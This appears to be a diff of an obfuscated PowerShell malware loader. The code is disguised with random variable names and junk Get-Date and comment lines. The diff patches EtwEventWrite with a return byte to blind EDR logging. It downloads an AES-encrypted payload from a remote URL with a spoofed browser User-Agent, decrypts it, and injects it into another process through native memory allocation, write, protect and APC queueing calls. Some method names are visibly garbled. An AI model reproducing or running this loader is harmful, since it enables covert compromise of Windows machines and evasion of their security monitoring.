+        [BitConverter]::GetBytes([long]$HkgVkwTrUgjULGRGxMtn).CopyTo($kMZIYWQeUuZEhxjuGc, 10)
+$null = Get-Date -Format "PXKe"
+        [Marshal]::Copy($kMZIYWQeUuZEhxjuGc, 0, $IghEHTdJHIR, 21)
+        $BAdxcFpzkt = [THVZObTuZHOT].GetNestedType($EEVgUvwwcrWKEBL)
+        $TIIKcEMeZosspe = [Marshal]::GetDelegateForFunctionPointer($IghEHTdJHIR, $BAdxcFpzkt)
+        return $TIIKcEMeZosspe.Invoke($DylGvmGlKiQilqSpT)
     }
 
-$null = Get-Date -Format "CsgW"
     # === ETW Blinding (Blind EDR Sensors) ===
     # Patch EtwEventWrite with 'ret' (0xC3)
-# zyyUfpgGZNcUJQEAHxKOSJmSmaTvsr
-    $NJcYjSznld = [bMazpMKnViMk]::GetModuleHandle("ntdll.dll")
-# qoGfnbdGqQzzaULaXCqBbgMYvwMClo
-    $ROxlgnOQYFchexNYXKdN = [bMazpMKnViMk]::GetProcAddress($NJcYjSznld, "EtwEventWrite")
-# kJUiSWlDZqiabwAKHlLBwSQHJFxQvi
-    if ($ROxlgnOQYFchexNYXKdN -ne [IntPtr]::Zero) {
-        $DVErgPcyhcFA = [IntPtr]-1
-# JGGcdiuhtYgPhmBZIwIXbJubbnGctu
-        $wNihsshjkFFVkrPYmIlo = [byte[]] @(0xC3) # ret
-        $KLTLjDUPJQ = [IntPtr]1
-        $yvXWbyfsfcZiblh = 0
+$null = Get-Date -Format "aRSp"
+    $tPGaDFGYGcTq = [THVZObTuZHOT]::GetModuleHandle("ntdll.dll")
+    $xZaLDjeQAXySSEWS = [THVZObTuZHOT]::GetProcAddress($tPGaDFGYGcTq, "EtwEventWrite")
+    if ($xZaLDjeQAXySSEWS -ne [IntPtr]::Zero) {
+        $FrDlZWmaEpvgI = [IntPtr]-1
+# RwItqoBjAiTyHYcdqvwQLuqOOYMBdd
+        $aaAFMpYajEtzwYpntN = [byte[]] @(0xC3) # ret
+        $CMWltDZeyzKMDUXjjarO = [IntPtr]1
+        $DGxkXgviXobcZS = 0
+$null = Get-Date -Format "Nkhm"
         
         # 1. Protect RWF
-        [void](fQLZAmOWfRgQ "IPuLNVSnpZnb" ($DVErgPcyhcFA, [ref]$ROxlgnOQYFchexNYXKdN, [ref]$KLTLjDUPJQ, 0x40, [out]$yvXWbyfsfcZiblh))
+$null = Get-Date -Format "fAIX"
+        [void](oaFArNYJdVee "oiCtQANrIYUB" ($FrDlZWmaEpvgI, [ref]$xZaLDjeQAXySSEWS, [ref]$CMWltDZeyzKMDUXjjarO, 0x40, [out]$DGxkXgviXobcZS))
         
         # 2. Write Patch
-# CReTZJKAvNkxTxOriAdTypwQJeWYBC
-        $kLpQWWIqMdC = 0
-        [void](fQLZAmOWfRgQ "IAbWRnOTrJxO" ($DVErgPcyhcFA, $ROxlgnOQYFchexNYXKdN, $wNihsshjkFFVkrPYmIlo, 1, [out]$kLpQWWIqMdC))
+        $RPENhGUnsQqccCai = 0
+# dpaPzyOIdNUlIahIuoiCojLEEcJnca
+        [void](oaFArNYJdVee "PHpphRLMrPAt" ($FrDlZWmaEpvgI, $xZaLDjeQAXySSEWS, $aaAFMpYajEtzwYpntN, 1, [out]$RPENhGUnsQqccCai))
         
         # 3. Restore Protection
-$null = Get-Date -Format "RQGU"
-        $ChWFYxqnAEaqULQA = 0
-        [void](fQLZAmOWfRgQ "IPuLNVSnpZnb" ($DVErgPcyhcFA, [ref]$ROxlgnOQYFchexNYXKdN, [ref]$KLTLjDUPJQ, $yvXWbyfsfcZiblh, [out]$ChWFYxqnAEaqULQA))
+        $nBvNMSlRkQHYrHfuvTIN = 0
+        [void](oaFArNYJdVee "oiCtQANrIYUB" ($FrDlZWmaEpvgI, [ref]$xZaLDjeQAXySSEWS, [ref]$CMWltDZeyzKMDUXjjarO, $DGxkXgviXobcZS, [out]$nBvNMSlRkQHYrHfuvTIN))
     }
-$null = Get-Date -Format "NdfA"
     # ========================================
-# aaVvwYGGlUJAepfCsSukUlFIfxFeaZ
 
     # NtAllocate
-    $gdrEdPqavv = [IntPtr]::Zero; $pxFbvwAhsgKswQfRYzS = [IntPtr]$LhHfNyfMBFToopET.Length
-# AYnHqjFchzxnSWCmXNMyXyecdcETyD
-    [void](fQLZAmOWfRgQ "cWyeWlNohCvy" ($pDGUTtLJXYNEMKaI.hProcess, [ref]$gdrEdPqavv, 0, [ref]$pxFbvwAhsgKswQfRYzS, 0x3000, 0x04))
+    $uTmuCoCgGsdX = [IntPtr]::Zero; $JbbVOvpaPBAcvi = [IntPtr]$RfqrRVhpulSgMclDubgM.Length
+$null = Get-Date -Format "XKAK"
+    [void](oaFArNYJdVee "nLVDUkLPagXv" ($duUFsiWmCyVfBo.hProcess, [ref]$uTmuCoCgGsdX, 0, [ref]$JbbVOvpaPBAcvi, 0x3000, 0x04))
 
-# WRoLCNKNUcOfzsnpVnWfGAPVKgZUso
     # NtWrite
-# OvUlDjpZTaImqPVdCFYqndAPwUbhFt
-    $oheMoXSuEJNYRSXKxuO = 0
-# TuvSBRxuplBHUsXgPrWnBRJfcMpdou
-    [void](fQLZAmOWfRgQ "IAbWRnOTrJxO" ($pDGUTtLJXYNEMKaI.hProcess, $gdrEdPqavv, $LhHfNyfMBFToopET, [uint]$LhHfNyfMBFToopET.Length, [out]$oheMoXSuEJNYRSXKxuO))
+    $DChsSLwOkp = 0
+    [void](oaFArNYJdVee "PHpphRLMrPAt" ($duUFsiWmCyVfBo.hProcess, $uTmuCoCgGsdX, $RfqrRVhpulSgMclDubgM, [uint]$RfqrRVhpulSgMclDubgM.Length, [out]$DChsSLwOkp))
+# cdHMpqCJvsSsElwjMCxYvGYtFRRftF
 
-# FUcjKGMeGXiwLfXvtGSoLFPJgDvJyV
     # NtProtect (RX)
-    $jUDlaNlRkNAuQUwsA = 0
-    [void](fQLZAmOWfRgQ "IPuLNVSnpZnb" ($pDGUTtLJXYNEMKaI.hProcess, [ref]$gdrEdPqavv, [ref]$pxFbvwAhsgKswQfRYzS, 0x20, [out]$jUDlaNlRkNAuQUwsA))
-$null = Get-Date -Format "uEFb"
+    $gcpftrekMfpwNjU = 0
+    [void](oaFArNYJdVee "oiCtQANrIYUB" ($duUFsiWmCyVfBo.hProcess, [ref]$uTmuCoCgGsdX, [ref]$JbbVOvpaPBAcvi, 0x20, [out]$gcpftrekMfpwNjU))
+$null = Get-Date -Format "qjcy"
 
-# yhhaQqEtYDDvTxfaVDUslnABOPQdnk
     # NtQueueApc
-    [void](fQLZAmOWfRgQ "AyfpKrOlTngg" ($pDGUTtLJXYNEMKaI.hThread, $gdrEdPqavv, 0, 0, 0))
+    [void](oaFArNYJdVee "cwsubzWwptmk" ($duUFsiWmCyVfBo.hThread, $uTmuCoCgGsdX, 0, 0, 0))
+# UaIlpJEapQDdhQcaEOAGBEGIgNjsyC
 
-# TwKTBuAGHNCKbBasSVGRaCmMkjiopt
     # NtResume
-# ACfVPmidHRbsnJPBptPfcYXHNfAaFC
-    $begqzZKoyOzVVKYvb = 0
-    [void](fQLZAmOWfRgQ "bMhWtMyESuBa" ($pDGUTtLJXYNEMKaI.hThread, [out]$begqzZKoyOzVVKYvb))
+    $WtSkBMVKahQ = 0
+    [void](oaFArNYJdVee "DPnwNbXaPQxT" ($duUFsiWmCyVfBo.hThread, [out]$WtSkBMVKahQ))
 }
 
-function HHrnVfURwFTf($haCMAKMnVdLjV, $rFlQYIrvzXfBFQeCpT) {
-    $QYXUqXEJPDV = $haCMAKMnVdLjV[0..15]; $VGxxjjRRLQJ = $haCMAKMnVdLjV[16..($haCMAKMnVdLjV.Length - 1)]; $k = [Convert]::FromBase64String($rFlQYIrvzXfBFQeCpT)
-    $UorndcAglFxevifCX = [Security.Cryptography.Aes]::Create()
-    $UorndcAglFxevifCX.Mode = "CBC"; $UorndcAglFxevifCX.Padding = "PKCS7"; $UorndcAglFxevifCX.Key = $k; $UorndcAglFxevifCX.IV = $QYXUqXEJPDV
-$null = Get-Date -Format "bMib"
-    $tJYOzvztITOJiTUUI = $UorndcAglFxevifCX.CreateHHrnVfURwFTfor(); $atoUwpgkQqHZ = New-Object IO.MemoryStream
-    $PNbopDbESMvJX = New-Object Security.Cryptography.CryptoStream($atoUwpgkQqHZ, $tJYOzvztITOJiTUUI, "Write")
-    $PNbopDbESMvJX.Write($VGxxjjRRLQJ, 0, $VGxxjjRRLQJ.Length); $PNbopDbESMvJX.FlushFinalBlock()
-$null = Get-Date -Format "Pkrj"
-    $fsnndktLNlHYcZugM = $atoUwpgkQqHZ.ToArray(); $PNbopDbESMvJX.Close(); $atoUwpgkQqHZ.Close(); $UorndcAglFxevifCX.Dispose()
-    return $fsnndktLNlHYcZugM
-$null = Get-Date -Format "uCNC"
+function OOamWXPGUrxz($mkylRRucELSPtRnWYoTm, $QWlhoycDadYYGevLNj) {
+    $CwbIZTxfucFB = $mkylRRucELSPtRnWYoTm[0..15]; $AxgbVPhpiTLSFJuSyC = $mkylRRucELSPtRnWYoTm[16..($mkylRRucELSPtRnWYoTm.Length - 1)]; $k = [Convert]::FromBase64String($QWlhoycDadYYGevLNj)
+    $RfqrRVhpulSgMclDubgMjZavDiEnUdI = [Security.Cryptography.Aes]::Create()
+# tRCxmGiKutSFUYWktbkluZzFjhefeA
+    $RfqrRVhpulSgMclDubgMjZavDiEnUdI.Mode = "CBC"; $RfqrRVhpulSgMclDubgMjZavDiEnUdI.Padding = "PKCS7"; $RfqrRVhpulSgMclDubgMjZavDiEnUdI.Key = $k; $RfqrRVhpulSgMclDubgMjZavDiEnUdI.IV = $CwbIZTxfucFB
+    $TotvurDgcEPW = $RfqrRVhpulSgMclDubgMjZavDiEnUdI.CreateOOamWXPGUrxzor(); $AnbsnPCZdCUVA = New-Object IO.MemoryStream
+    $RtlkOKtMreubht = New-Object Security.Cryptography.CryptoStream($AnbsnPCZdCUVA, $TotvurDgcEPW, "Write")
+    $RtlkOKtMreubht.Write($AxgbVPhpiTLSFJuSyC, 0, $AxgbVPhpiTLSFJuSyC.Length); $RtlkOKtMreubht.FlushFinalBlock()
+    $AcUgViYXxqjSWpRqu = $AnbsnPCZdCUVA.ToArray(); $RtlkOKtMreubht.Close(); $AnbsnPCZdCUVA.Close(); $RfqrRVhpulSgMclDubgMjZavDiEnUdI.Dispose()
+    return $AcUgViYXxqjSWpRqu
 }
+# aHyAlwaNkouovBfODkwKRYtQbiHhqU
 
 try {
-    $mMalZRzjPYW = New-Object Net.WebClient
-$null = Get-Date -Format "zEtU"
-    $mMalZRzjPYW.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-    $haCMAKMnVdLjV = $mMalZRzjPYW.DownloadData($fpJLTDTegUgB)
-    $LhHfNyfMBFToopET = HHrnVfURwFTf $haCMAKMnVdLjV $ySilwrZupPfeYfSTeY
-    CCUQmiDmNQya $LhHfNyfMBFToopET
+    $PAvSVMifmqOUD = New-Object Net.WebClient
+$null = Get-Date -Format "nPag"
+    $PAvSVMifmqOUD.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+# RtKTjNtVspxlrDWRzcbtNGWPLfLEnu
+    $mkylRRucELSPtRnWYoTm = $PAvSVMifmqOUD.DownloadData($DvwYvuZeGIQfrTSMiYeU)
+# jLRfXXwzWSYKBBouKjiOWvEqQuWiNb
+    $RfqrRVhpulSgMclDubgM = OOamWXPGUrxz $mkylRRucELSPtRnWYoTm $HwOKhHCveYBc
+    dWhceaVuvOYh $RfqrRVhpulSgMclDubgM
 }
-$null = Get-Date -Format "VTFO"
+# TeOCQSKixIMqqiUMYNORHfVRUzdlzW
 catch { Exit }
+# iWXDKRIAkhjjUavdwuatDwtrbCvjzs
 
-$null = Get-Date -Format "KrEK"
